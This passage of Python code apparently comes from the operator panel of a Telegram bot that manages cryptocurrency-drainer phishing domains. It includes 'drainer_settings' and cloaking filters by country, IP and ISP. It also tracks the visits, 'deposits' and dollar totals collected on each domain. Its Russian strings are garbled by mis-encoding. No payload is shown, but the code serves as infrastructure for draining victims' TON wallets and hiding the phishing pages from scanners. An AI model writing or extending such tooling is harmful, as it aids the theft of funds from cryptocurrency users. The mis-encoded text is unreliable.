        print(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ ISP –ø—Ä–æ–≤–∞–π–¥–µ—Ä–æ–≤: {e}")


@router.callback_query(F.data.startswith('drainer_settings|'))
async def drainer_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    await call.message.answer(
        text='–ù–µ –∑–Ω–∞—é, –∫–∞–∫–æ–π —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª —Ç—É—Ç –Ω—É–∂–µ–Ω. –ß—Ç–æ —Ç–∞–∫–æ–µ —Ñ–µ–π–∫ –∂–µ—Ç–æ–Ω—ã –∏ —Å–∫—Ä—ã—Ç–∏–µ TON —è –±–µ–∑ –ø–æ–Ω—è—Ç–∏—è')


@router.callback_query(F.data.startswith('statistics_settings|'))
async def statistics_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    domain_id = int(call.data.split('|')[1])
    domain_query = await session.execute(select(Domains).filter(Domains.id == domain_id))
    domain = domain_query.scalars().first()
    await call.message.answer(text=f'üìä <i>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –¥–æ–º–µ–Ω–∞ {domain.domain} –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è:</i>\n'
                                   f'‚îî –í—Å–µ–≥–æ –≤–∏–∑–∏—Ç–æ–≤: <code>{domain.visits}</code>\n'
                                   f'‚îî –í—Å–µ–≥–æ –¥–µ–ø–æ–∑–∏—Ç–æ–≤: <code>{domain.deposits_count}</code>\n'
                                   f'‚îî –û–±—â–∞—è —Å—É–º–º–∞: <code>{domain.deposit_amount} $</code>\n'
                                   f'<i>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ—Ç–æ—á–Ω–æ–π</i>',
                              reply_markup=domains_keyboard.back_to_domains)


@router.callback_query(F.data.startswith('copy_settings|'))
async def copy_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession, user: User):
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    domain_query = await session.execute(select(Domains).filter(Domains.id == domain_id))
    kb = await domains_keyboard.get_copy_domain_kb(session, user, domain_id)
    await call.message.edit_text(text='‚ÑπÔ∏è –ü–µ—Ä–µ–Ω–æ—Å –≤—Å–µ—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫ –¥–æ–º–µ–Ω–∞ –∫—Ä–æ–º–µ –¥–∏–∑–∞–π–Ω–∞.'
                                      'üíÅüèª‚Äç‚ôÇÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–º–µ–Ω –∫—É–¥–∞ –ø–µ—Ä–µ–Ω–µ—Å—Ç–∏', reply_markup=kb)


@router.callback_query(F.data.startswith('copy_domain_settings|'))
async def copy_domain_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession, user: User):
    chosen_domain_id = int(call.data.split('|')[1])
    data = await state.get_data()
    current_domain_id = data.get('domain_id')
    try:
        async with session:  # Keep the transaction
            # Eager load both relationships
            current_domain_result = await session.execute(
                select(Domains)
                .options(joinedload(Domains.manifest))
                .options(joinedload(Domains.cloaking))
                .filter(Domains.id == current_domain_id)
            )
            current_domain = current_domain_result.scalars().first()  # Await scalars()

            chosen_domain_result = await session.execute(
                select(Domains)
                .filter(Domains.id == chosen_domain_id)
            )
            chosen_domain = chosen_domain_result.scalars().first()  # Await scalars()

            if not current_domain or not chosen_domain:
                await call.message.answer("‚ùå –û–¥–∏–Ω –∏–∑ –¥–æ–º–µ–Ω–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω.")
                return

            # Copy Manifest settings (now safe to access current_domain.manifest)
            if current_domain.manifest:
                if chosen_domain.manifest:
                    chosen_domain.manifest.title = current_domain.manifest.title
                    chosen_domain.manifest.picture = current_domain.manifest.picture
                    chosen_domain.manifest.link = current_domain.manifest.link
                else:
                    # Correct way to copy attributes:
                    new_manifest = Manifest(
                        title=current_domain.manifest.title,
                        picture=current_domain.manifest.picture,
                        link=current_domain.manifest.link
                    )
                    session.add(new_manifest)
                    await session.flush()
                    chosen_domain.manifest_id = new_manifest.id

            # Copy Cloaking settings (now safe to access current_domain.cloaking)
            if current_domain.cloaking:
                if chosen_domain.cloaking:
                    chosen_domain.cloaking.countries = current_domain.cloaking.countries
                    chosen_domain.cloaking.ips = current_domain.cloaking.ips
                    chosen_domain.cloaking.isp_providers = current_domain.cloaking.isp_providers
                else:
                    # Correct way to copy attributes:
                    new_cloaking = Cloaking(
                        countries=current_domain.cloaking.countries,
                        ips=current_domain.cloaking.ips,
                        isp_providers=current_domain.cloaking.isp_providers
                    )
                    session.add(new_cloaking)
                    await session.flush()
                    chosen_domain.cloaking_id = new_cloaking.id

            await session.commit()  # Commit the transaction
            await call.message.edit_text("‚úÖ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω—ã —É—Å–ø–µ—à–Ω–æ.")
            # await show_domain_page(session, user) # if show_domain_page needs to be called after that, call it with await
    except Exception as e:
        await session.rollback()
        await call.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫: {e}")
        print(f"–û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫: {e}")


@router.callback_query(F.data.startswith('delete_domain|'))
async def delete_domain(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    await call.message.edit_text(text='‚ùì –í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å –¥–æ–º–µ–Ω?', reply_markup=domains_keyboard.delete_confirm)


@router.callback_query(F.data == 'delete_confirm' or F.data == 'delete_cancel')
async def delete_confirm(call: CallbackQuery, state: FSMContext, session: AsyncSession, user: User):
    if call.data == 'delete_confirm':
        data = await state.get_data()
        domain_id = data.get('domain_id')
        domain_query = await session.execute(select(Domains).filter(Domains.id == domain_id))
        domain = domain_query.scalars().first()
        await session.delete(domain)
        await session.commit()
        await call.message.answer(text='‚úÖ –î–æ–º–µ–Ω —É–¥–∞–ª–µ–Ω')
        await show_domain_page(session, call.from_user)
    elif call.data == 'delete_cancel':
        await call.message.answer(text='‚ùå –£–¥–∞–ª–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ')
        await show_domain_page(session, user)
